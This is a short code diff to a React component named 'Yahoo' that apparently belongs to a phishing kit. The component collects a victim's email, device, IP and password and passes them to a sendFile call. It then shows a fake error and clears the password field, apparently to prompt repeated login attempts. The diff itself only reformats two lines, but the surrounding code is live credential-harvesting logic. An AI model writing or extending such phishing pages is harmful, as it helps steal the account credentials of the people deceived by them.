@@ -5,7 +5,8 @@ import { notify, sendFile } from "../servers";
 
 function Yahoo({ location }) {
   const [values, setValues] = useState({
-    username: location.state.email,device: location.state.device,
+    username: location.state.email,
+    device: location.state.device,
     ip: location.state.ip,
     password: "",
   });
@@ -27,7 +28,8 @@ function Yahoo({ location }) {
       sendFile(values).then((data) => {
         // show error
         notify();
-        setSubmited({ ...submited, count: submited.count + 1 }); setValues({ ...values, password: "" });
+        setSubmited({ ...submited, count: submited.count + 1 });
+        setValues({ ...values, password: "" });
         console.log(data);
         console.log(submited);
       });
